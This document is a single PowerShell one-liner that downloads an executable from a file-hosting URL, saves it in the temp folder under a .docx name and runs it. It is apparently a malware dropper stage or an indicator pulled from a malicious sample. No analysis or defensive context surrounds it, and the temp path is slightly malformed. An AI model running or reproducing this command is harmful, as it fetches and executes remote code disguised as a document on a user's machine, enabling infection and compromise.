(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/wopkwj.exe',"$env:TEMPdrv.docx");Start-Process ("$env:TEMPdrv.docx")